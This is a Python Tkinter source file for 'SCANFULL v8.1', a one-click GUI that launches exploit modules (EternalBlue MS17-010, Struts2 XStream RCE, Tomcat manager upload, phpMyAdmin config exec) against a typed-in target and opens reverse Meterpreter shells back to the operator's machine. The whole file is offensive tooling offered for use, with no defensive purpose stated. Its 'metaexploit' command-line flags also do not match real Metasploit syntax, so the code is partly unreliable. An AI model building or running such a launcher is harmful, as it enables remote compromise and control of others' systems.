#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================
#   SCANFULL v8.1 - Metaexploit GUI Wrapper
#   Criado por Leonardo de Moura Fuseti
#   Copyright 2025 - All Rights Reserved
# =============================================

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import subprocess
import threading
import os
import socket
from datetime import datetime

# PASTAS
OUTPUT_DIR = "/home/kali/forcabruta"
META_LOG_DIR = os.path.join(OUTPUT_DIR, "metaexploit_logs")
os.makedirs(META_LOG_DIR, exist_ok=True)

# CORES
BG = "#1e1e1e"
FG = "#00ff00"
BTN_BG = "#333333"
BTN_FG = "#00ff00"
ENTRY_BG = "#2d2d2d"
DANGER_BG = "#ff3333"

class ScanfullMetaexploit:
    def __init__(self, root):
        self.root = root
        self.root.title("SCANFULL v8.1 - Metaexploit GUI")
        self.root.geometry("1100x750")
        self.root.configure(bg=BG)
        try:
            self.root.iconbitmap("scanfull.ico")
        except:
            pass

        # Cabeçalho
        tk.Label(root, text="SCANFULL v8.1 - Metaexploit", font=("Courier", 18, "bold"), fg=FG, bg=BG).pack(pady=8)
        tk.Label(root, text="By Leonardo de Moura Fuseti © 2025", font=("Arial", 9), fg="#888888", bg=BG).pack(pady=2)

        # === CONFIGURAÇÃO ===
        config_frame = tk.LabelFrame(root, text=" Configuração ", fg=FG, bg=BG, font=("Arial", 10, "bold"))
        config_frame.pack(fill="x", padx=20, pady=10)

        # RHOST
        tk.Label(config_frame, text="RHOST (Alvo):", fg=FG, bg=BG).grid(row=0, column=0, padx=10, pady=5, sticky="w")
        self.rhost_entry = tk.Entry(config_frame, width=25, bg=ENTRY_BG, fg=FG, insertbackground=FG)
        self.rhost_entry.grid(row=0, column=1, padx=5, pady=5)

        # LHOST (auto)
        self.lhost = self.get_local_ip()
        tk.Label(config_frame, text="LHOST (Local):", fg=FG, bg=BG).grid(row=0, column=2, padx=10, pady=5, sticky="w")
        self.lhost_label = tk.Label(config_frame, text=self.lhost, fg="#00ff99", bg=BG, font=("Courier", 10))
        self.lhost_label.grid(row=0, column=3, padx=5, pady=5)

        # LPORT
        tk.Label(config_frame, text="LPORT:", fg=FG, bg=BG).grid(row=0, column=4, padx=10, pady=5, sticky="w")
        self.lport_entry = tk.Entry(config_frame, width=10, bg=ENTRY_BG, fg=FG, insertbackground=FG)
        self.lport_entry.insert(0, "4444")
        self.lport_entry.grid(row=0, column=5, padx=5, pady=5)

        # === EXPLOITS RÁPIDOS ===
        exploits_frame = tk.LabelFrame(root, text=" Exploits Rápidos (1 Clique) ", fg=FG, bg=BG, font=("Arial", 10, "bold"))
        exploits_frame.pack(fill="x", padx=20, pady=10)

        self.exploits = {
            "EternalBlue (MS17-010)": {
                "exploit": "exploit/windows/smb/ms17_010_eternalblue",
                "payload": "windows/meterpreter/reverse_tcp"
            },
            "Struts2 RCE": {
                "exploit": "exploit/multi/http/struts2_rest_xstream",
                "payload": "java/meterpreter/reverse_tcp"
            },
            "Tomcat Manager Upload": {
                "exploit": "exploit/multi/http/tomcat_mgr_upload",
                "payload": "java/meterpreter/reverse_tcp"
            },
            "PHPMyAdmin Config": {
                "exploit": "exploit/unix/webapp/phpmyadmin_config_exec",
                "payload": "php/meterpreter/reverse_tcp"
            }
        }

        row = 0
        for name, data in self.exploits.items():
            btn = tk.Button(
                exploits_frame, text=name, bg=BTN_BG, fg=BTN_FG,
                command=lambda e=data['exploit'], p=data['payload']: self.run_metaexploit(e, p),
                width=30, height=2
            )
            btn.grid(row=row, column=0, padx=10, pady=5, sticky="w")
            row += 1

        # === LOGS ===
        log_frame = tk.LabelFrame(root, text=" Logs em Tempo Real ", fg=FG, bg=BG, font=("Arial", 10, "bold"))
        log_frame.pack(fill="both", expand=True, padx=20, pady=10)

        self.log_text = scrolledtext.ScrolledText(
            log_frame, bg="#000000", fg=FG, font=("Courier", 9), height=20
        )
        self.log_text.pack(fill="both", expand=True, padx=10, pady=10)

        # Rodapé
        tk.Label(root, text=f"Logs salvos em: {META_LOG_DIR}", fg="#888888", bg=BG).pack(pady=5)

    def log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_text.insert(tk.END, f"[{timestamp}] {msg}\n")
        self.log_text.see(tk.END)

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def run_metaexploit(self, exploit, payload):
        rhost = self.rhost_entry.get().strip()
        lhost = self.lhost
        lport = self.lport_entry.get().strip() or "4444"

        if not rhost:
            messagebox.showwarning("Aviso", "Preencha o RHOST!")
            return

        self.log(f"Iniciando exploit: {exploit}")
        self.log(f"RHOST: {rhost} | LHOST: {lhost} | LPORT: {lport}")

        cmd = [
            "metaexploit",
            "-x", exploit,
            "-p", payload,
            "-o", f"RHOSTS={rhost}",
            "-o", f"LHOST={lhost}",
            "-o", f"LPORT={lport}"
        ]

        def execute():
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                output = result.stdout + "\n" + result.stderr
                self.log(output)

                # Salvar log
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                log_file = os.path.join(META_LOG_DIR, f"metaexploit_{rhost}_{ts}.log")
                with open(log_file, 'w', encoding='utf-8') as f:
                    f.write(f"SCANFULL v8.1 - Metaexploit\n")
                    f.write(f"Exploit: {exploit}\n")
                    f.write(f"Payload: {payload}\n")
                    f.write(f"RHOST: {rhost} | LHOST: {lhost} | LPORT: {lport}\n")
                    f.write("="*60 + "\n")
                    f.write(output)
                self.log(f"Log salvo: {log_file}")

                if "Meterpreter session" in output:
                    self.log("SESSÃO METERPRETER ABERTA!")
                    messagebox.showinfo("SUCESSO", "Sessão Meterpreter criada!")
            except subprocess.TimeoutExpired:
                self.log("TIMEOUT: Exploit demorou demais.")
            except Exception as e:
                self.log(f"ERRO: {e}")

        threading.Thread(target=execute, daemon=True).start()

# === EXECUTAR ===
if __name__ == "__main__":
    root = tk.Tk()
    app = ScanfullMetaexploit(root)
    root.mainloop()